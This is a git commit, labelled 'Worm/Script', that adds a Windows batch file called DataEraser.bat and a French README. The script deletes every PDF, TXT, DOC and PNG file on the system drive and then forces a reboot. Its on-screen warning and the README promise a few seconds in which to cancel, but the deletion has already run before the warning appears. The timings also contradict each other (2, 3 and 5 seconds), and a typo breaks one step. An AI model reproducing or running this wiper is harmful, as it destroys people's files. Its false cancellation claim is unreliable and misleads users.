9651802e23e4a975a4d689633a12820e44a4b1b6
Ardies <lebonadjanohoun7@gmail.com>
2023-10-25 20:14:33 +0100

    Worm/Script Personal - Ardies

---
+++ DataEraser.bat
@@ -0,0 +1,26 @@
+﻿@echo off
+
+
+REM Supression des Fichiers Pdf
+DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"
+
+REM Supression des Fichiers Txt
+DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"
+
+REM Supression des Fichiers Documents
+DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"
+
+REM Supression des Fichiers Png
+DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
+vecho Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
+
+REM La Supression des Fichiers est terminée
+REM Le script peut être personalisé pour la suppression de d'autres types de fichiers
+
+echo Tous vos fichiers d'importation ont été supprimés. Vous disposer de 3 secondes pour fermer la fenêtre avant que la suppression de vos fichiers soit effectif pour toujours!
+
+timeout 5 > NUL
+shutdown.exe /r /t 00
---
+++ Readme.md
@@ -0,0 +1,7 @@
+# DataEraser 
+
+Si l'utilisateur ferme la fenêtre de la console avant que le délai de 2 secondes ne s'écoule, le script ne poursuivra pas l'exécution des commandes suivantes, y compris la commande de redémarrage du système. En d'autres termes, le script s'arrêtera immédiatement et n'exécutera pas la commande de redémarrage.
+
+Cela signifie que si l'utilisateur ferme la fenêtre de la console dans les 2 secondes, les fichiers spécifiés ne seront pas supprimés, et le système ne redémarrera pas automatiquement. L'utilisateur a ainsi un bref laps de temps pour annuler le processus s'il le souhaite
+
+[] DataEraser.bat
